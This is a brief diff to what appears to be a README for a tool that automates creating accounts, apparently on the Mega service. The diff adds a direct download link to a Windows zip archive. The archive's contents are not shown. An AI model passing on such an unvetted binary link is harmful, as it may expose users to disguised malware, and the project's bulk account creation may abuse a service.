@@ -7,3 +7,5 @@ Use config.json to customize account generation process.
 Suggest improvements please
 
 Give a star if this project helped you
+
+Download link: https://github.com/ybhaw/MegaAccountAutomator/raw/master/Win64x.zip
